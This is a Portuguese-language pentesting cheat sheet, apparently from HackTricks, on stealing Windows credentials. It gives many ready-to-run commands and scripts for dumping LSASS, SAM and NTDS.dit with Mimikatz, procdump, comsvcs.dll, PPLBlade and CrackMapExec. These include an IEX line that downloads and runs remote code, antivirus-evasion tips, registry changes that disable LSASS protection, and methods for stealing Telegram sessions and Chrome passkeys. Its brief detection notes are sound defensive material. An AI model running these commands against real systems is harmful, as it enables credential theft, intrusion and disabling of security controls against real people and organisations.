# Roubo de credenciais do Windows

{{#include ../../banners/hacktricks-training.md}}

## Credenciais do Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Descubra outras coisas que o Mimikatz pode fazer em** [**nesta página**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Saiba mais sobre algumas proteções possíveis para credenciais aqui.**](credentials-protections.md) **Essas proteções podem impedir que o Mimikatz extraia algumas credenciais.**

## Credenciais com Meterpreter

Use o [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **que** criei para **procurar senhas e hashes** na vítima.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Contornando o AV

### Procdump + Mimikatz

Como **Procdump da** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**é uma ferramenta legítima da Microsoft**, ela não é detectada pelo Defender.\
Você pode usar essa ferramenta para **fazer o dump do processo lsass**, **baixar o dump** e **extrair** as **credenciais localmente** do dump.

Você também pode usar [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Esse processo é feito automaticamente com [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Alguns **AV** podem **detectar** como **malicioso** o uso do **procdump.exe para fazer dump de lsass.exe**; isso acontece porque estão **detectando** as strings **"procdump.exe" e "lsass.exe"**. Portanto, é mais **furtivo** passar como **argumento** o **PID** de lsass.exe para o procdump **em vez do** **nome lsass.exe.**

### Fazendo dump de lsass com **comsvcs.dll**

Uma DLL chamada **comsvcs.dll**, encontrada em `C:\Windows\System32`, é responsável por **fazer dump da memória do processo** em caso de falha. Essa DLL inclui uma **função** chamada **`MiniDumpW`**, projetada para ser invocada usando `rundll32.exe`.\
Os dois primeiros argumentos são irrelevantes, mas o terceiro é dividido em três componentes. O ID do processo do qual será feito o dump é o primeiro componente, o local do arquivo de dump é o segundo, e o terceiro componente deve ser exatamente a palavra **full**. Não há opções alternativas.\
Após analisar esses três componentes, a DLL cria o arquivo de dump e transfere para ele a memória do processo especificado.\
É possível usar **comsvcs.dll** para fazer dump do processo lsass, eliminando assim a necessidade de carregar e executar o procdump. Esse método é descrito em detalhes em [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

O seguinte comando é usado para executar:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Você pode automatizar esse processo com** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Despejando lsass com o Gerenciador de Tarefas**

1. Clique com o botão direito na barra de tarefas e clique em Gerenciador de Tarefas
2. Clique em Mais detalhes
3. Procure o processo "Local Security Authority Process" na guia Processos
4. Clique com o botão direito no processo "Local Security Authority Process" e clique em "Criar arquivo de despejo".

### Despejando lsass com procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) é um binário assinado pela Microsoft que faz parte da suíte [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Um despejo de falha do sistema completo já existente, ou uma cópia compactada em uma pasta de usuário acessível, pode preservar material de credenciais para análise offline. Nomes de arquivo como `MEMORY.DMP` e `MEMORY.7z` são apenas indícios para análise: verifique a procedência e o acesso, e não presuma que contenham credenciais utilizáveis ou atuais.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Dumping lsass com PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) é uma ferramenta para fazer dump de processos protegidos que oferece suporte à ofuscação do dump de memória e à transferência para estações de trabalho remotas sem gravá-lo no disco.

**Funcionalidades principais**:

1. Bypass da proteção PPL
2. Ofuscação de arquivos de dump de memória para evitar mecanismos de detecção do Defender baseados em assinaturas
3. Upload do dump de memória pelos métodos RAW e SMB, sem gravá-lo no disco (dump fileless)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – dumping de LSASS baseado em SSP sem MiniDumpWriteDump

O Ink Dragon distribui um dumper de três estágios chamado **LalsDumper** que nunca chama `MiniDumpWriteDump`, então os hooks de EDR nessa API nunca são acionados:<sup>[[3]](#references)</sup>

1. **Carregador do estágio 1 (`lals.exe`)** – procura em `fdp.dll` um marcador composto por 32 caracteres `d` minúsculos, substitui-o pelo caminho absoluto para `rtu.txt`, salva a DLL modificada como `nfdp.dll` e chama `AddSecurityPackageA("nfdp","fdp")`. Isso força o **LSASS** a carregar a DLL maliciosa como um novo Security Support Provider (SSP).
2. **Estágio 2 dentro do LSASS** – quando o LSASS carrega `nfdp.dll`, a DLL lê `rtu.txt`, aplica XOR a cada byte com `0x20` e mapeia o blob decodificado na memória antes de transferir a execução.
3. **Dumper do estágio 3** – o payload mapeado reimplementa a lógica do MiniDump usando **direct syscalls** resolvidas a partir de nomes de API com hash (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Uma exportação dedicada chamada `Tom` abre `%TEMP%\<pid>.ddt`, grava um dump compactado do LSASS no arquivo e fecha o handle para que a exfiltração possa ocorrer depois.

Notas do operador:

* Mantenha `lals.exe`, `fdp.dll`, `nfdp.dll` e `rtu.txt` no mesmo diretório. O estágio 1 substitui o marcador codificado pelo caminho absoluto para `rtu.txt`, portanto, separá-los interrompe a cadeia.
* O registro é feito adicionando `nfdp` a `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Você pode inserir esse valor para fazer o LSASS recarregar o SSP a cada inicialização.
* Os arquivos `%TEMP%\*.ddt` são dumps compactados. Descompacte-os localmente e, em seguida, use Mimikatz/Volatility para extrair credenciais.
* A execução de `lals.exe` exige direitos de administrador/SeTcb para que `AddSecurityPackageA` seja bem-sucedido; assim que a chamada retorna, o LSASS carrega o SSP malicioso de forma transparente e executa o estágio 2.
* Remover a DLL do disco não a descarrega do LSASS. Exclua a entrada do registro e reinicie o LSASS (reinicializando o sistema), ou mantenha-a para persistência de longo prazo.

## CrackMapExec

### Dump de hashes SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Dump LSA secrets

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Faça o dump do NTDS.dit do DC alvo

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump do histórico de senhas do NTDS.dit do DC alvo

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Mostrar o atributo pwdLastSet para cada conta do NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Roubando SAM & SYSTEM

Esses arquivos devem estar **localizados** em _C:\windows\system32\config\SAM_ e _C:\windows\system32\config\SYSTEM._ Mas **você não pode simplesmente copiá-los de maneira comum** porque estão protegidos.

### Do Registry

A maneira mais fácil de roubar esses arquivos é obter uma cópia do Registry:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Baixe** esses arquivos para sua máquina Kali e **extraia os hashes** usando:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Volume Shadow Copy

Você pode copiar arquivos protegidos usando este serviço. Você precisa ser Administrador.

#### Usando vssadmin

O binário vssadmin está disponível apenas nas versões do Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Mas você também pode fazer o mesmo no **Powershell**. Este é um exemplo de **como copiar o arquivo SAM** (a unidade usada é "C:" e ele é salvo em C:\users\Public), mas você pode usar isso para copiar qualquer arquivo protegido:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Finalmente, você também poderia usar o [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para fazer uma cópia de SAM, SYSTEM e ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Credenciais do Active Directory - NTDS.dit**

O arquivo **NTDS.dit** é conhecido como o coração do **Active Directory**, pois contém dados cruciais sobre objetos de usuário, grupos e suas associações. É nele que são armazenados os **hashes de senha** dos usuários do domínio. Esse arquivo é um banco de dados **Extensible Storage Engine (ESE)** e fica em **_%SystemRoom%/NTDS/ntds.dit_**.

Esse banco de dados mantém três tabelas principais:

- **Data Table**: encarregada de armazenar detalhes sobre objetos, como usuários e grupos.
- **Link Table**: mantém o controle das relações, como associações a grupos.
- **SD Table**: contém os **descritores de segurança** de cada objeto, garantindo a segurança e o controle de acesso aos objetos armazenados.

A pesquisa de Christoffer Andersson sobre a camada de banco de dados documenta essas tabelas e seu comportamento específico de cada versão com mais detalhes.<sup>[[8]](#references)</sup>

O Windows usa _Ntdsa.dll_ para interagir com esse arquivo, e ele é usado pelo _lsass.exe_. Portanto, **parte** do arquivo **NTDS.dit** pode estar localizada **na memória do `lsass`** (os dados acessados mais recentemente provavelmente podem ser encontrados ali devido ao ganho de desempenho proporcionado pelo uso de um **cache**).

#### Descriptografando os hashes dentro de NTDS.dit

O hash é criptografado três vezes:

1. Descriptografar a chave de criptografia de senha (**PEK**) usando o **BOOTKEY** e **RC4**.
2. Descriptografar o **hash** usando a **PEK** e **RC4**.
3. Descriptografar o **hash** usando **DES**.

A **PEK** tem o **mesmo valor em todos os controladores de domínio**, mas é **criptografada** dentro do **NTDS.dit** com o **BOOTKEY** específico do controlador de domínio, proveniente do hive **SYSTEM** desse controlador. Portanto, para extrair credenciais, são necessários tanto o **NTDS.dit** quanto o **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Copiando NTDS.dit usando Ntdsutil

Disponível desde o Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Você também pode usar o truque de [**volume shadow copy**](#stealing-sam-and-system) para copiar o arquivo **ntds.dit**. Lembre-se de que também precisará de uma cópia do **arquivo SYSTEM** (novamente, use o truque de [**extraí-lo do registro ou usar o volume shadow copy**](#stealing-sam-and-system)).

### **Extraindo hashes de NTDS.dit**

Depois de **obter** os arquivos **NTDS.dit** e **SYSTEM**, você pode usar ferramentas como _secretsdump.py_ para **extrair os hashes**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Você também pode **extraí-las automaticamente** usando um usuário administrador de domínio válido:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

Para **arquivos NTDS.dit grandes**, recomenda-se extraí-los usando [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Por fim, você também pode usar o **módulo do metasploit**: _post/windows/gather/credentials/domain_hashdump_ ou **mimikatz** `lsadump::lsa /inject`

### **Extraindo objetos de domínio do NTDS.dit para um banco de dados SQLite**

Os objetos do NTDS podem ser extraídos para um banco de dados SQLite com [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Não são extraídos apenas os secrets, mas também os objetos completos e seus atributos, para extrair mais informações quando o arquivo NTDS.dit bruto já tiver sido obtido.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

O hive `SYSTEM` é opcional, mas permite descriptografar secrets (hashes NT e LM, credenciais suplementares, como senhas em texto claro, chaves kerberos ou de trust e históricos de senhas NT e LM). Além de outras informações, são extraídos os seguintes dados: contas de usuário e máquina com seus hashes, flags UAC, timestamps do último logon e da alteração de senha, descrições das contas, nomes, UPN, SPN, grupos e associações recursivas, árvore de unidades organizacionais e associações, domínios confiáveis com tipo, direção e atributos dos trusts...

## Lazagne

Baixe o binário [aqui](https://github.com/AlessandroZ/LaZagne/releases). Você pode usar esse binário para extrair credenciais de vários softwares.

```
lazagne.exe all
```

## Outras ferramentas para extrair credenciais do SAM e do LSASS

### Windows credentials Editor (WCE)

Esta ferramenta pode ser usada para extrair credenciais da memória. Baixe-a em: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Extraia credenciais do arquivo SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Extraia credenciais do arquivo SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Baixe-o em:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) e simplesmente **execute-o** para extrair as senhas.

## Mineração de sessões RDP ociosas e enfraquecimento dos controles de segurança

O FinalDraft RAT do Ink Dragon inclui um tasker `DumpRDPHistory` cujas técnicas são úteis para qualquer red-teamer:<sup>[[3]](#references)</sup>

### Coleta de telemetria no estilo DumpRDPHistory

* **Alvos de RDP de saída** – analise cada hive de usuário em `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Cada subchave armazena o nome do servidor, `UsernameHint` e o timestamp da última gravação. Você pode replicar a lógica do FinalDraft com PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Evidências de RDP de entrada** – consulte o log `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pelos IDs de evento **21** (logon bem-sucedido) e **25** (desconexão) para identificar quem administrou a máquina:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Depois de descobrir qual Domain Admin se conecta regularmente, faça o dump do LSASS (com LalsDumper/Mimikatz) enquanto a sessão **desconectada** ainda existir. O fallback de CredSSP + NTLM deixa o verifier e os tokens no LSASS, que podem então ser reutilizados via SMB/WinRM para obter o `NTDS.dit` ou estabelecer persistência nos controladores de domínio.

### Downgrades do registro visados pelo FinalDraft

O mesmo implante também adultera várias chaves do registro para facilitar o roubo de credenciais:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* Definir `DisableRestrictedAdmin=1` força a reutilização completa de credenciais/tickets durante o RDP, permitindo pivots no estilo pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` desativa a filtragem de tokens do UAC, permitindo que administradores locais obtenham tokens irrestritos pela rede.
* `DSRMAdminLogonBehavior=2` permite que o administrador do DSRM faça logon enquanto o DC está online, dando aos atacantes outra conta integrada de alto privilégio.
* `RunAsPPL=0` remove as proteções PPL do LSASS, tornando trivial o acesso à memória para dumpers como o LalsDumper.

## Credenciais de configuração do hMailServer (pós-comprometimento)

Verifique os arquivos de configuração exatos `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` e `C:\ProgramData\hMailServer\hMailServer.ini`, de acordo com o layout da instalação. Um valor legível e não vazio em `[Security] AdministratorPassword=` é um hash da senha de administração do hMailServer; não é evidência de uma senha de Administrador do Windows. Se essa credencial for recuperada, qualquer pivot para uma conta do Windows exige a verificação independente da reutilização da senha e dos direitos de logon.

Em instalações que usam um banco de dados SQL CE, o valor separado `[Database] Password=` no INI protege o banco de dados. Em instalações legadas, esse valor é criptografado com Blowfish usando a chave estática `THIS_KEY_IS_NOT_SECRET` e inversões de endianness de palavras de 4 bytes. Use a string hexadecimal do INI com este snippet Python:<sup>[[2]](#references)</sup>

Primeiro, confirme que a conta atual consegue ler **tanto** o INI quanto o arquivo `.sdf` correspondente do banco de dados SQL CE. A senha do INI protege o banco de dados; ela é separada dos hashes das contas de caixa de correio armazenados nele. Inspecione ou atualize uma **cópia** de um banco de dados em uso; nunca o arquivo ativo.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Com a senha em texto claro, copie o banco de dados SQL CE para evitar bloqueios de arquivo, carregue o provedor de 32 bits e atualize-o, se necessário, antes de consultar os hashes:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

A coluna `accountpassword` usa o formato de hash do hMailServer (modo do hashcat `1421`). Uma senha de caixa de correio crackeada só se torna um pivot para um usuário do Windows se essa senha for reutilizada por uma conta local/de domínio e essa conta tiver os direitos necessários de logon remoto.

## Interceptação do callback de logon da LSA (LsaApLogonUserEx2)

Algumas ferramentas capturam **senhas de logon em plaintext** interceptando o callback de logon da LSA `LsaApLogonUserEx2`. A ideia é fazer hook ou encapsular o callback do pacote de autenticação para capturar credenciais **durante o logon** (antes do hashing) e, em seguida, gravá-las em disco ou retorná-las ao operador. Isso geralmente é implementado como uma ferramenta auxiliar que injeta código na LSA ou se registra nela e, depois, registra cada evento bem-sucedido de logon interativo/de rede, incluindo nome de usuário, domínio e senha.<sup>[[1]](#references)</sup>

Notas operacionais:
- Requer privilégios de administrador local/SYSTEM para carregar a ferramenta auxiliar no caminho de autenticação.
- As credenciais capturadas só aparecem quando ocorre um logon (interativo, RDP, de serviço ou de rede, dependendo do hook).

## Credenciais de conexão salvas do SSMS (sqlstudio.bin)

O SQL Server Management Studio (SSMS) armazena informações de conexão salvas em um arquivo `sqlstudio.bin` por usuário. Ferramentas de dump dedicadas podem analisar o arquivo e recuperar credenciais SQL salvas. Em shells que retornam apenas a saída dos comandos, o arquivo costuma ser exfiltrado codificando-o em Base64 e imprimindo-o em stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

No lado do operador, reconstrua o arquivo e execute o dumper localmente para recuperar credenciais:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Roubo de sessão `tdata` do Telegram Desktop

O Telegram Desktop mantém os dados de autorização e o estado da conta no diretório **`tdata`**. Uma sessão copiada pode ser carregada por ferramentas compatíveis para autenticar sem a senha da conta enquanto essa autorização permanecer válida; se a criptografia de dados locais estiver ativada, o stealer também precisará da senha de acesso. Uma sessão autenticada pode então expor dados de identidade, metadados de diálogos e associações, mensagens e mídias que podem ser baixadas.<sup>[[10]](#references)</sup>

### Descoberta e aquisição

Pesquise layouts instalados e portáteis; os nomes dos pacotes da Microsoft Store variam, então enumere os diretórios de pacotes que contenham `TelegramMessenge` e inspecione a subárvore `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Se as leituras comuns falharem e o token do processo **já contiver e tiver habilitado** `SeBackupPrivilege`, o acesso compatível com backup oferece uma alternativa; ele não obtém o privilégio nem eleva o processo. `CreateFileW` com `FILE_FLAG_BACKUP_SEMANTICS` pode solicitar semântica de backup/restauração e ignorar verificações de segurança de arquivos quando os privilégios necessários estiverem presentes no token, mas a flag, por si só, não supera um bloqueio de compartilhamento incompatível.<sup>[[10]](#references)[[11]](#references)</sup>

Para arquivos ativos bloqueados, crie/leia uma **Volume Shadow Copy**; para arquivos bloqueados por ACLs, `robocopy /B` usa o modo de backup e ignora as ACLs de arquivos e diretórios.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

Um implante que economiza largura de banda pode enviar primeiro apenas o inventário de caminhos dos arquivos, receber um identificador de snapshot e os caminhos já armazenados pelo C2 e, então, enviar apenas os arquivos ausentes. Portanto, pequenas transferências incrementais após a enumeração recursiva de `tdata` ainda podem representar o roubo bem-sucedido de uma sessão.<sup>[[10]](#references)</sup>

### Detecção e contenção

Correlacione o acesso recursivo a `tdata` por um processo que não seja do Telegram com a habilitação de `SeBackupPrivilege`, aberturas de arquivos com semântica de backup, atividade de VSS ou um processo filho `robocopy.exe` usando `/B`. Procure também enumerações rápidas de `%APPDATA%` e `%LOCALAPPDATA%\Packages`, seguidas de conexões de saída do mesmo processo. Após o comprometimento, use **Configurações → Dispositivos** (ou **Privacidade e segurança → Sessões ativas**) para encerrar sessões não reconhecidas; habilitar a verificação em duas etapas, por si só, não revoga uma autorização que já foi roubada.<sup>[[10]](#references)[[13]](#references)</sup>

## Roubo de credenciais de passkeys / WebAuthn do Chrome no Windows

Se for obtida execução de código como **usuário vítima** em um host Windows usando **Chrome + passkeys sincronizadas pelo Google Password Manager**, as passkeys se tornam um alvo interessante de post-exploitation, mesmo **sem admin/SYSTEM**.<sup>[[4]](#references)</sup>

### Artefatos locais interessantes

```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** armazena registros **`WebauthnCredentialSpecifics`** codificados em protobuf. Um processo do mesmo usuário pode enumerar o **RP ID**, o **username**, o **credential ID** e o material da chave privada criptografado das passkeys sincronizadas.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** armazena o estado local de inscrição do dispositivo, como **`wrapped_identity_private_key`** e o segredo encapsulado usado para recuperar credenciais sincronizadas.<sup>[[4]](#references)</sup>

Triagem rápida:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### Blobs de chave vinculados ao TPM ainda podem ser abusados como oracle de assinatura local

Se o navegador exportar uma chave de identidade respaldada pelo TPM como **`NCRYPT_OPAQUE_KEY_BLOB`** e armazenar esse blob em um estado acessível ao usuário, o malware **não** precisa extrair a chave privada bruta. Ele pode simplesmente reimportar o blob na **mesma máquina** e pedir ao TPM local para assinar dados controlados pelo atacante:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Isso significa que **a vinculação ao hardware impede a exportação para fora do dispositivo, mas não o uso pelo mesmo usuário no endpoint comprometido**.

### Caminhos práticos de abuso

1. **Pass-ta-key / retransmissão de identidade do dispositivo**<sup>[[4]](#references)</sup>
   - Enumerar `WebauthnCredentialSpecifics` do LevelDB do Chrome.
   - Iniciar um login com passkey e obter um novo desafio WebAuthn.
   - Usar o blob `wrapped_identity_private_key` roubado no TPM da vítima para assinar a vinculação da solicitação do cloud-authenticator.
   - Retransmitir a assertion retornada para a relying party.
   - Isso é especialmente valioso quando a RP aceita `userVerification=preferred` ou não rejeita assertions com **`UV=0`**.
2. **Sequestro de chave UV pendente**<sup>[[4]](#references)</sup>
   - Forçar o novo onboarding excluindo `passkey_enclave_state` ou enviando uma operação `device/forget` assinada válida.
   - Se o onboarding deixar o dispositivo em **`uv_key_pending`**, registrar uma chave pública UV controlada pelo atacante.
   - Se o provedor não verificar a attestation / a origem de secure-hardware da nova chave UV, as assinaturas posteriores feitas com a chave do atacante serão tratadas como **`UV=1`**.
3. **Roubo do segredo mestre / recuperação do SDS**<sup>[[4]](#references)</sup>
   - Forçar a recuperação ou a reinserção para que o Chrome obtenha o segredo mestre das passkeys sincronizadas.
   - Monitorar a recriação/modificação de `passkey_enclave_state` e, em seguida, despejar a memória do Chrome enquanto o **segredo do domínio de segurança (SDS)** em texto simples estiver residente.
   - Usar o SDS recuperado para descriptografar os campos criptografados em cada registro `WebauthnCredentialSpecifics` e recuperar chaves privadas WebAuthn portáteis.

### Ideias de DFIR / detecção

- Monitorar a **exclusão/recriação** de `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Alertar sobre acessos anormais ao **`Sync Data\LevelDB`** do Chrome por processos que não sejam do navegador.
- Alertar sobre **despejos de memória do Chrome** ou acesso suspeito à memória entre processos.
- Investigar solicitações repetidas do **PIN de recuperação do Google Password Manager** ou novos onboardings inesperados.
- Lembre-se de que o **`signCount`** do WebAuthn muitas vezes não é útil para passkeys sincronizadas, pois pode permanecer constante; portanto, a detecção clássica de clonagem é pouco eficaz.

## References

- [1] [Unit 42 – Uma investigação sobre anos de operações não detectadas que visavam setores de alto valor](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing por macro VBA do Word via SMTP → descriptografia de credenciais do hMailServer → Veeam CVE-2023-27532 para SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
